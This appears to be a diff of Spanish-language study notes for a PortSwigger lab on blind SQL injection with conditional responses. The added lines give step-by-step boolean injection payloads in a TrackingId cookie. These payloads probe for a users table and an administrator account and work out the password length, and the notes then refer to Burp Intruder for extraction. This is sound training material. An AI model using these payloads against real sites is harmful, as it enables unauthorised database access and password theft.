@@ -32,5 +32,37 @@ Cookie: TrackingId=uzXff1VVIKHXZYZZ'+AND+'1'%3d'1;
 y si nos devuelve el "Welcome back" message que aparece en el home page del lab 
 significa que la pagina es vulnerable a Blind SQL injection. 
 
+3) Luego para usar el repeter y para saber como usar el intruder podemos usar estos pasos: 
 
+https://portswigger.net/web-security/sql-injection/blind/lab-conditional-responses
+
+3.5) Reconocimiento de las tablas: 
+
+Cookie: TrackingId=uzXff1VVIKHXZYZZ'+AND+(SELECT+'a'+FROM+users+LIMIT+1)%3d'a
+
+Agregando esto podemos identificar si hay o no una tabla llamada "users",
+el welcome page nos retorna el "welcome Back" message por lo tanto quiere decir que si hay 1 tabla llamada "users"
+
+4) Ahora lo cambiamos a esto: 
+
+Cookie: TrackingId=uzXff1VVIKHXZYZZ'+AND+(SELECT+'a'+FROM+users+WHERE+username%3d'administrator')%3d'a
+
+y con esto comprobamos que dentro de la tabla "users" existe el username "administrator"
+
+
+5) Avergiuando el largo del password: 
+
+Cookie: TrackingId=uzXff1VVIKHXZYZZ'+AND+(SELECT+'a'+FROM+users+WHERE+username%3d'administrator'+AND+LENGTH(password)>1)%3d'a
+
+Con este comando vemos que el largo de "password" es mayor a 1. Luego lo podemos modificar asi: 
+
+Cookie: TrackingId=uzXff1VVIKHXZYZZ'+AND+(SELECT+'a'+FROM+users+WHERE+username%3d'administrator'+AND+LENGTH(password)>2)%3d'a
+Cookie: TrackingId=uzXff1VVIKHXZYZZ'+AND+(SELECT+'a'+FROM+users+WHERE+username%3d'administrator'+AND+LENGTH(password)>3)%3d'a
+
+hasta que el "welcome message" desaparece. El largo de la contraseña en este lab es de 20 caracteres. 
+
+
+6) Aqui debemos usar el intruder de burp suite con este link: https://portswigger.net/web-security/sql-injection/blind/lab-conditional-responses
+
+3au9
 
